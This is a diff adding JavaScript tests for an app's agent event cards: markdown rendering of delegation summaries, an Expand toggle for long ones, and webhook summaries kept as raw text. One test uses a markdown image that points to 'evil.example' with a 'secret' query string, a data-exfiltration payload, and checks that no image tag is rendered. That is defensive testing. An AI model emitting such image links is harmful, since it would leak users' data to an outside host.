@@ -35,3 +35,23 @@ test("a user hand-over's task card names the requester; a plain task card does n
   assert.match(render(ev.buildTaskEvent({ taskId: "t", title: "x", requestedBy: "user", handedFrom: "Julien" })), /handed over from Julien/);
   assert.doesNotMatch(render(ev.buildTaskEvent({ taskId: "t", title: "x", requestedBy: "user" })), /handed over/);
 });
+
+test("a delegation summary renders as markdown; a long one folds behind an Expand toggle", () => {
+  const short = render(ev.delegationEventOfTask({ ...done, result: "**bold** finding" }));
+  assert.match(short, /<strong>bold<\/strong>/);
+  assert.doesNotMatch(short, /aria-expanded/);
+  const long = render(ev.delegationEventOfTask({ ...done, result: Array.from({ length: 40 }, (_, i) => `- finding ${i}`).join("\n") }));
+  assert.match(long, /class="agent-event-summary is-collapsed"/);
+  assert.match(long, /aria-expanded="false"/);
+  assert.match(long, />Expand</);
+});
+
+test("a delegation summary never loads a markdown image", () => {
+  const html = render(ev.delegationEventOfTask({ ...done, result: "![pixel](https://evil.example/p.png?d=secret)" }));
+  assert.doesNotMatch(html, /<img/);
+  assert.match(html, /🖼 pixel/);
+});
+
+test("a webhook summary stays raw text", () => {
+  assert.match(render(ev.buildWebhookEvent({ taskId: "w", triggerId: "g", title: "alert", status: "completed", summary: "**raw**" })), /\*\*raw\*\*/);
+});
